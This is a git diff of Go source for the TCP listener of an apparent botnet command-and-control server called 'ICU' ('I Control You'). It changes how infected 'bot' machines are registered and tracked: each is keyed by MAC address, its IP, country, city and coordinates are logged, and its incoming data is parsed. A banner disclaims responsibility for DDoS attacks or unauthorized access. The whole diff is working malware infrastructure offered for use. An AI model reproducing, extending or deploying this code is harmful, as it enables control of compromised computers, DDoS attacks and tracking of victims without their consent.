@@ -1,13 +1,14 @@
 package modules
 
 import (
-	"c2-server/config"
-	"c2-server/constants"
-	"c2-server/lib"
-	"c2-server/types"
 	"encoding/hex"
 	"errors"
 	"fmt"
+	"icu/common/config"
+	"icu/common/constants"
+	"icu/common/types"
+	"icu/common/utils"
+	"icu/lib"
 	"io"
 	"net"
 	"os"
@@ -37,13 +38,15 @@ func (this *TCPServer) StartServer() error {
 	}
 	defer listener.Close()
 
-	fmt.Println("\n" + ` ██████╗   ██╗    ██████╗    ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
-██╔════╝   ██║   ██╔════╝    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
-██║     ████████╗██║         ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
-██║     ██╔═██╔═╝██║         ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
-╚██████╗██████║  ╚██████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
- ╚═════╝╚═════╝   ╚═════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
-                                                                              `)
+	fmt.Print("\033[31m\n" + `  _____ _____ _    _
+ |_   _/ ____| |  | | {0.5.0#dev}
+   | || |    | |  | |
+   | || |    | |  | |
+  _| || |____| |__| | I Control You :) :(
+ |_____\_____|\____/
+` + "\n\033[0m")
+
+	fmt.Println("\033[33m[!] ICU is not responsible for DDoS attacks or unauthorized access. \nThe responsibility for such actions lies with the violators.\n\033[0m")
 
 	this.logger.Info(fmt.Sprintf("Server started %s:%d", this.host, this.port))
 
@@ -74,23 +77,38 @@ func (this *TCPServer) handleConnectionCallback(conn net.Conn) {
 }
 
 func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
+	emitter := lib.NewEventEmitter()
+	botClient := NewBotClient(conn, this.cache, emitter)
+	botClient.isBotConnected = true
+
 	defer func() {
-		this.cache.RemoveCache(lib.GetMAC())
+		this.cache.RemoveCache(utils.MacPrettyConvert(botClient.mac))
 		this.logger.Info(fmt.Sprintf("Bot disconnect: %s", conn.RemoteAddr()))
 	}()
 
-	fmt.Println(hex.EncodeToString(data))
-  
-	mac := lib.GetMAC()
-	ipgeo := lib.GetIPGeo()
+	emitter.On("hello-pack-received", func(received interface{}) {
+		this.cache.NewInitial(utils.MacPrettyConvert(botClient.mac))
 
-	this.cache.NewInitial(mac)
-	this.cache.SetCache(mac, "ipgeo", ipgeo, 10*time.Minute)
+		// ipgeo unmarshal
+		var ipgeoStruct types.IPGeo
+		if err := json.Unmarshal([]byte(*botClient.ipgeo), &ipgeoStruct); err != nil {
+			return
+		}
 
-	this.logger.Info(fmt.Sprintf("CONNECTED: %s:%d", this.cache.GetCache(mac, "ipgeo").(*types.IPGeo).IP, conn.RemoteAddr().(*net.TCPAddr).Port))
+		this.cache.SetCache(utils.MacPrettyConvert(botClient.mac), "ipgeo", ipgeoStruct, 10*time.Minute)
+		cache := this.cache.GetCache(utils.MacPrettyConvert(botClient.mac), "ipgeo").(types.IPGeo)
+		this.logger.Info(fmt.Sprintf("CONNECTED PC[%s %s, %s (%f, %f)]", cache.IP, cache.CountryName, cache.City, cache.Latitude, cache.Longitude))
+	})
+
+	emitter.On("error", func(error interface{}) {
+		this.logger.Error(error.(string))
+	})
+
+	// HELLO PACKET
+	botClient.parseData(data)
+	mac := utils.MacPrettyConvert(botClient.mac)
 
 	buffer := make([]byte, constants.MAX_PACKET_SIZE)
-
 	for {
 		data, err := conn.Read(buffer)
 		if err != nil {
@@ -110,6 +128,6 @@ func (this *TCPServer) handleBot(conn net.Conn, data []byte) {
 		}
 
 		this.logger.Info(fmt.Sprintf("DATA[%d]: %s", data, hex.EncodeToString(buffer[:data])))
-		// deviceClient.parseDate(buffer[:data])
+		botClient.parseData(buffer[:data])
 	}
 }
